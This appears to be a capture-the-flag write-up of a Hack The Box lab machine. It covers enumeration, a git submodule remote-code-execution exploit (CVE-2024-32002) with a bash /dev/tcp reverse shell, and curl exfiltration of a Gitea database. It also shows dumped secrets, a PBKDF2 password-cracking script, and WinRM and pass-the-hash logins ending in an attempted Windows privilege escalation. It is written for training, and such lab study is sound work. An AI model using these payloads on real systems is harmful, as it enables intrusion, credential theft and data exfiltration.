# Initial Enumeration

As usual we can start by checking all the alive services reachable from the outside over the TCP protocoll.

```
PORT     STATE SERVICE    REASON          VERSION
3000/tcp open  ppp?       syn-ack ttl 127
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=7c8e094129f1a3ad; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=ZO5DR-IH_8tt6Kxi2Uu4aA0AICI6MTcyMjE3NDg3NTM5ODM5MjIwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 28 Jul 2024 13:54:35 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-arc-green">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Git</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0Iiwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21waWxlZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbGVkLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMwMDA
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=34d0823827938e6c; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=3pzo-2ygUeNcYMmak8a7GjBaAcU6MTcyMjE3NDg4MDcyODA2MDEwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 28 Jul 2024 13:54:40 GMT
|_    Content-Length: 0
5000/tcp open  upnp?      syn-ack ttl 127
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Sun, 28 Jul 2024 13:54:37 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5234
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Compiled - Code Compiling Services</title>
|     <!-- Bootstrap CSS -->
|     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
|     <!-- Custom CSS -->
|     <style>
|     your custom CSS here */
|     body {
|     font-family: 'Ubuntu Mono', monospace;
|     background-color: #272822;
|     color: #ddd;
|     .jumbotron {
|     background-color: #1e1e1e;
|     color: #fff;
|     padding: 100px 20px;
|     margin-bottom: 0;
|     .services {
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
5985/tcp open  http       syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp open  pando-pub? syn-ack ttl 127
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.94SVN%I=7%D=7/28%Time=66A64D9B%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,3550,"HTTP/1\.0\x20200\x20OK\r\nCache-Contr
SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git
SF:ea=7c8e094129f1a3ad;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo
SF:kie:\x20_csrf=ZO5DR-IH_8tt6Kxi2Uu4aA0AICI6MTcyMjE3NDg3NTM5ODM5MjIwMA;\x
SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt
SF:ions:\x20SAMEORIGIN\r\nDate:\x20Sun,\x2028\x20Jul\x202024\x2013:54:35\x
SF:20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"the
SF:me-arc-green\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"widt
SF:h=device-width,\x20initial-scale=1\">\n\t<title>Git</title>\n\t<link\x2
SF:0rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoiR2
SF:l0Iiwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21wa
SF:WxlZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbGVk
SF:Lmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l
SF:6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMwMD
SF:A")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Method\x20Not\x20All
SF:owed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control:\x20max-age=0,
SF:\x20private,\x20must-revalidate,\x20no-transform\r\nSet-Cookie:\x20i_li
SF:ke_gitea=34d0823827938e6c;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nS
SF:et-Cookie:\x20_csrf=3pzo-2ygUeNcYMmak8a7GjBaAcU6MTcyMjE3NDg4MDcyODA2MDE
SF:wMA;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Fra
SF:me-Options:\x20SAMEORIGIN\r\nDate:\x20Sun,\x2028\x20Jul\x202024\x2013:5
SF:4:40\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.94SVN%I=7%D=7/28%Time=66A64D9D%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,1521,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3
SF:\x20Python/3\.12\.3\r\nDate:\x20Sun,\x2028\x20Jul\x202024\x2013:54:37\x
SF:20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length
SF::\x205234\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20l
SF:ang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\
SF:x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\
SF:x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Compiled\x20-\x20Code\
SF:x20Compiling\x20Services</title>\n\x20\x20\x20\x20<!--\x20Bootstrap\x20
SF:CSS\x20-->\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"https
SF:://stackpath\.bootstrapcdn\.com/bootstrap/4\.5\.2/css/bootstrap\.min\.c
SF:ss\">\n\x20\x20\x20\x20<!--\x20Custom\x20CSS\x20-->\n\x20\x20\x20\x20<s
SF:tyle>\n\x20\x20\x20\x20\x20\x20\x20\x20/\*\x20Add\x20your\x20custom\x20
SF:CSS\x20here\x20\*/\n\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20'Ubuntu\x20Mono
SF:',\x20monospace;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20backg
SF:round-color:\x20#272822;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20color:\x20#ddd;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\.jumbotron\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20background-color:\x20#1e1e1e;\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20padding:\x20100px\x2020px;\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20margin-bottom:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0}\n\x20\x20\x20\x20\x20\x20\x20\x20\.services\x20{\n\x20")%r(RTSPReque
SF:st,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<hea
SF:d>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x2
SF:0\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<
SF:h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20
SF:code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x2
SF:0request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<p>Error\x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x
SF:20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\
SF:n</html>\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP (85%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows XP SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=7/28%OT=3000%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=66A64DFF%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=10A%TI=I%II=I%SS=S%TS=U)
OPS(O1=M550NW8NNS%O2=M550NW8NNS%O3=M550NW8%O4=M550NW8NNS%O5=M550NW8NNS%O6=M550NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M550NW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 5000/tcp)
HOP RTT      ADDRESS
1   28.45 ms 10.10.14.1
2   28.58 ms 10.129.1.189
```

We can do same for UDP services this time:

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads/Compiled]
└─# nmap -sU -F 10.129.1.189          
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-28 16:00 CEST
Nmap scan report for 10.129.1.189
Host is up (0.029s latency).
All 100 scanned ports on 10.129.1.189 are in ignored states.
Not shown: 100 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 4.33 seconds
```

Nothing so far, I guess we can move on to specific services enumerations.

&nbsp;

# Gitlab

On port 3000/TCP we can see traces of a self-hosted Gutlab server with 2 repositories so far:

![08fa271965d5717077b4e21fc3e49a49.png](../../../_resources/08fa271965d5717077b4e21fc3e49a49.png)

The second seems a easy calculator written in C++ where instead the first one is more interesting as it seems referring to the service running over the port 5000/TCP as a remote compiler based in dotnet?

![8356384be3384241413818ddebd251c9.png](../../../_resources/8356384be3384241413818ddebd251c9.png)

And seems like is is running as the user "Richard"?

![96caf2f87a6f39f9cc5372843bb166a3.png](../../../_resources/96caf2f87a6f39f9cc5372843bb166a3.png)It is clear that the application fetches the .git repository only from an unsecure sources(\*HTTP\*) and it compiles the result. In this case I would expect either some kind of strange CVE on the dotnet, or deserialization attacks.

![206a368a1401c9f1fe1e09908bf4e303.png](../../../_resources/206a368a1401c9f1fe1e09908bf4e303.png)

Now we have a base code from the repository so let's engage Burpsuite and see what exactly can we get?

![4bbb74adedf2b4015c44be2fbaaa06d6.png](../../../_resources/4bbb74adedf2b4015c44be2fbaaa06d6.png)

And we can see that the repository have been cloned?

![c127ec40cb094b51b9cf0fa82442e162.png](../../../_resources/c127ec40cb094b51b9cf0fa82442e162.png)

Now in this case I would like to footprint what is the backend in this case I guess I need to host the code on my server instead?

But then looking into the Calculator app on the wiki we can see that the user Richard might have a very specific version of git installed on the machine?

![8e56cb699f279b71c0a217fa97cf4b8e.png](../../../_resources/8e56cb699f279b71c0a217fa97cf4b8e.png)

That 2.45.0 might be exploitable to gain RCE via CVE? https://amalmurali.me/posts/git-rce/

I will try to use this as code from the repository:

https://github.com/markuta/CVE-2024-32002

The attack chain follows:

- Create 2 repositories on my username![5054666fc912d38f9ef37bfc76128090.png](../../../_resources/5054666fc912d38f9ef37bfc76128090.png)
    
- Firstly I added the effective payload that invokes as shell from git
    
    ```
    cd hooky
    mkdir -p y/hooks 
    cat > y/hooks/post-checkout <<EOF
    #!/bin/bash
    bash -i >& /dev/tcp/10.10.14.90/5555 0>&1
    EOF
    chmod +x y/hooks/post-checkout
    git add y/hooks/post-checkout
    git commit -m post-checkout
    hook_repo_path="$(pwd)"
    ```
    
- Resulting in something similar![af2042dc02f418882a1e8b4e63c00697.png](../../../_resources/af2042dc02f418882a1e8b4e63c00697.png)
    
- Next I created the actual carrier(aka Captain) that will call back the malicious checkout command on the "Hook" repository
    
    ```
    cd rce/
    git submodule add --name x/y "http://10.129.12.111:3000/yovecio/hooky.git" A/modules/x
    git commit -m add-submodule
    printf .git >dotgit.txt
    git hash-object -w --stdin <dotgit.txt >dot-git.hash
    printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" >index.info
    git update-index --index-info <index.info
    git commit -m add-symlink
    ```
    
- Resulting in something similar, ![e289f3c17c90690c7d3e63d6f8491729.png](../../../_resources/e289f3c17c90690c7d3e63d6f8491729.png)![8b8fbf8f37171d7c92c67bb892e1bc37.png](../../../_resources/8b8fbf8f37171d7c92c67bb892e1bc37.png)As you see the submodule is pointing to my external repository, that is hosted on the first step and this eventially gave me back a reverse shell.
    

![9ef3963b78bac850d5b26201a38cd744.png](../../../_resources/9ef3963b78bac850d5b26201a38cd744.png)

&nbsp;

# Road to user.txt

Now seems like Richard home doesn't holds any user.txt file so if we look around we can see another unsername called Emily and Administrator:

![4683fb43acbae3055fe431d00dc075e9.png](../../../_resources/4683fb43acbae3055fe431d00dc075e9.png)

Now we need to find a way to escape this damn git shell to a more powershell and to do so we might be able use the python3?

```
Richard@COMPILED MINGW64 /c/app/venv
$ cat pyvenv.cfg
cat pyvenv.cfg
home = C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0
include-system-site-packages = false
version = 3.12.3
executable = C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0\python.exe
command = C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0\python.exe -m venv C:\app\venv
```

My first idea is to maybe get the password hashes from gittea.bd?

![811c8041c7dc7f43b26b46c040ceae17.png](../../../_resources/811c8041c7dc7f43b26b46c040ceae17.png)

Specifically we night have a hardcoded token?

```
Richard@COMPILED MINGW64 /c/Program Files/Gitea/custom/conf
$ cat app.ini
cat app.ini
RUN_USER = COMPILED\Richard
APP_NAME = Git
RUN_MODE = prod
WORK_PATH = C:\Program Files\gitea

[ui]
DEFAULT_THEME = arc-green

[database]
DB_TYPE = sqlite3
HOST = 127.0.0.1:3306
NAME = gitea
USER = gitea
PASSWD = 
SCHEMA = 
SSL_MODE = disable
PATH = C:\Program Files\gitea\data\gitea.db
LOG_SQL = false

[repository]
ROOT = C:/Program Files/gitea/data/gitea-repositories

[server]
SSH_DOMAIN = gitea.compiled.htb
DOMAIN = gitea.compiled.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.compiled.htb:3000/
APP_DATA_PATH = C:\Program Files\gitea/data
DISABLE_SSH = false
SSH_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = ten8FWelzw36S77bYSUGlVCmrZn4jncN1ekaH1NoXO4
OFFLINE_MODE = false

[lfs]
PATH = C:/Program Files/gitea/data/lfs

[mailer]
ENABLED = false

[service]
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
DISABLE_REGISTRATION = false
ALLOW_ONLY_EXTERNAL_REGISTRATION = false
ENABLE_CAPTCHA = false
REQUIRE_SIGNIN_VIEW = false
DEFAULT_KEEP_EMAIL_PRIVATE = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true
DEFAULT_ENABLE_TIMETRACKING = true
NO_REPLY_ADDRESS = noreply.localhost

[openid]
ENABLE_OPENID_SIGNIN = true
ENABLE_OPENID_SIGNUP = true

[cron.update_checker]
ENABLED = false

[session]
PROVIDER = file

[log]
MODE = console
LEVEL = info
ROOT_PATH = C:/Program Files/gitea/log

[repository.pull-request]
DEFAULT_MERGE_STYLE = merge

[repository.signing]
DEFAULT_TRUST_MODEL = committer

[security]
INSTALL_LOCK = true
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MTY0MDEzMDR9.oQ3gsIgAi1_JTKKbw0lCKjwfcB3v7HvH6Wzb6M7dkE0
PASSWORD_HASH_ALGO = pbkdf2

[oauth2]
JWT_SECRET = XCXy54fFBqA-KAHA0Cjn5wp1gO4l-LY2-qgCS58VJO0
```

Now to parse eaier the file I will use this plugin that extents the python http.server to upload function as well: https://github.com/Densaugeo/uploadserver

```
Richard@COMPILED MINGW64 /c/Program Files/Gitea/data
$ curl -X POST http://10.10.14.90:8000/upload -F 'files=@gitea.db'
curl -X POST http://10.10.14.90:8000/upload -F 'files=@gitea.db'
```

![d20adcb056fce1c3c91630fc2b9eff6c.png](../../../_resources/d20adcb056fce1c3c91630fc2b9eff6c.png)

I used this service to export all data to CSV:

```
https://inloop.github.io/sqlite-viewer/#
```

And now we can see the password hash:

![c84242b7a57f6fddcba98be6a16b11d4.png](../../../_resources/c84242b7a57f6fddcba98be6a16b11d4.png)

Now I asked chatgpt to create me a python script that would get the password hash, salt, algo, iterations from the csv and hack it with passwords from rockyou.txt:

```
└─# cat bruter.py       
import hashlib
import binascii

def pbkdf2_hash(password, salt, iterations=50000, dklen=50):
    hash_value = hashlib.pbkdf2_hmac(
        'sha256',  # hashing algorithm
        password.encode('utf-8'),  # password
        salt,  # salt
        iterations,  # number of iterations
        dklen=dklen  # key length
    )
    return hash_value

def find_matching_password(dictionary_file, target_hash, salt, iterations=50000, dklen=50):
    target_hash_bytes = binascii.unhexlify(target_hash)

    with open(dictionary_file, 'r', encoding='utf-8') as file:
        for line in file:
            password = line.strip()

            # Generating hash
            hash_value = pbkdf2_hash(password, salt, iterations, dklen)

            # Check if hash is correct
            if hash_value == target_hash_bytes:
                print(f"Found password: {password}")
                return password

    print("Password not found.")
    return None

# Parameters
salt = binascii.unhexlify('227d873cca89103cd83a976bdac52486')  # Salt from gitea.db
target_hash = '97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16'  # Hash from gitea.db

# Path to dictionary
dictionary_file = '/usr/share/wordlists/rockyou.txt'

find_matching_password(dictionary_file, target_hash, salt)
```

This gives us a very easy and dumb password:

![1786b15474320270d3cc3252c9c755d3.png](../../../_resources/1786b15474320270d3cc3252c9c755d3.png)

Now we should be able to use that with Winrm?

![99782a879e27fd7a6dbd5ee142952d8d.png](../../../_resources/99782a879e27fd7a6dbd5ee142952d8d.png)

And likewise we can grab our first flag:

```
*Evil-WinRM* PS C:\Users\Emily> cd Desktop
*Evil-WinRM* PS C:\Users\Emily\Desktop> ls


    Directory: C:\Users\Emily\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         7/28/2024   8:44 PM             34 user.txt


*Evil-WinRM* PS C:\Users\Emily\Desktop> cat user.txt
6f28052201ac266a7738e73be6c16808
*Evil-WinRM* PS C:\Users\Emily\Desktop>
```

&nbsp;

# Road to root.txt

Now we need to find a way on what to do from emily and I see some permissions:

```
*Evil-WinRM* PS C:\> whoami /all

USER INFORMATION
----------------

User Name      SID
============== =============================================
compiled\emily S-1-5-21-4093338461-994521390-3704224775-1001


GROUP INFORMATION
-----------------

Group Name                                   Type             SID          Attributes
============================================ ================ ============ ==================================================
Todos                                        Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users              Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                         Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Usuarios autentificados         Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Esta compa¤¡a                   Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Cuenta local                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Autenticaci¢n NTLM              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Etiqueta obligatoria\Nivel obligatorio medio Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled
```

For root I got tipsed to use this one:

&nbsp;https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/

Now I am having some issues with my session, so I will upload Runas.exe to invoke a better session!

```
*Evil-WinRM* PS C:\Temp> ./RunasCs.exe emily 12345678 cmd.exe -r 10.10.14.90:4455

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-339018e$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 3912 created in background.
*Evil-WinRM* PS C:\Temp>
```

Now we should be able to check if the service is running?

![2b5fe2707f073a1cfa215bb50dc6cd56.png](../../../_resources/2b5fe2707f073a1cfa215bb50dc6cd56.png)

yeah, good then we should be ale to use the exploit? https://github.com/Wh04m1001/CVE-2024-20656?tab=readme-ov-file

Here I tried to follow the guide but was failing so I will justgive up as I don't find this machine attractive at all!

&nbsp;

# Another day

I decided to come back on this topic and indeed we need to get the RCE via that exploit we found last time...

We need to adapt the code and match the local path of the WSDisagnostic.exe on the victim machine:

![9d2ada8ef245eb42bbd5d50cd3b6f8ba.png](../../../_resources/9d2ada8ef245eb42bbd5d50cd3b6f8ba.png)

And change the copy function to spawn a shell instead!

![6e399988ef426e4db153deb10c0f9131.png](../../../_resources/6e399988ef426e4db153deb10c0f9131.png)

Now we need to compile the exploit and upload it to the victim, and setup a Havoc C2 as welll so we can catch back the shell session!

![419f025a74400d0cfa48cec7a575db65.png](../../../_resources/419f025a74400d0cfa48cec7a575db65.png)

We can query the `VSStandardCollectorService150` service and see that momentally it is stopped:

```
C:\Temp>sc.exe query VSStandardCollectorService150
sc.exe query VSStandardCollectorService150

SERVICE_NAME: VSStandardCollectorService150 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Temp>
```

Now when I tried last time it failed, most likely caused by the service being down? I will try both before and after staring the service...

Indeed running the Exploit with the service off it is not kicking in the service right, so let's start the service and try again..

But after many issues I found out that I was using the debug and not the release version:

![144a6fd8b160b97cbb324e44453459f5.png](../../../_resources/144a6fd8b160b97cbb324e44453459f5.png)

Indeed now I see more stuff:

```
PS C:\temp> ./Expl.exe  
./Expl.exe
[+] Junction \\?\C:\caeb109e-092a-4906-b4d4-1f51ce45094b -> \??\C:\c3a4bb61-0e12-4f12-87e7-4384df193559 created!
[-] Cannot start process!
PS C:\temp>
```

So here I decided to ditch this damn machine and get the flag directly instead:

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads]
└─# evil-winrm -i compiled.htb -u Administrator -H f75c95bc9312632edec46b607938061e
^[[6~                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd  Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          8/2/2024   9:29 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
6fcc94c13dbc8ff7abac2c024583cda0
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

&nbsp;

&nbsp;